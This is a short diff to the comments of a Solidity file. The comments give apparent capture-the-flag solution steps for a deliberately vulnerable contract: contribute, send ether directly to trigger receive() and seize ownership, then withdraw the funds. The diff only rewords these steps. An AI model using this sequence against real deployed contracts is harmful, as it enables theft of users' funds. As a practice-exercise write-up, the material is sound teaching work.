@@ -7,10 +7,10 @@ pragma solidity ^0.8.24;
  */
 
 /*
-1. Start by contributing to fullfill the require statement in the receive() function
+1. Contribute to the contract:
 await contract.contribute({ value: toWei("0.00001") });
 
-2. Send eth to the contract directly to trigger the receive() function
+2. Send ether to the contract directly to trigger the receive() function:
 await contract.sendTransaction({ value: toWei("0.00001") });
 
 3. Withdraw the funds
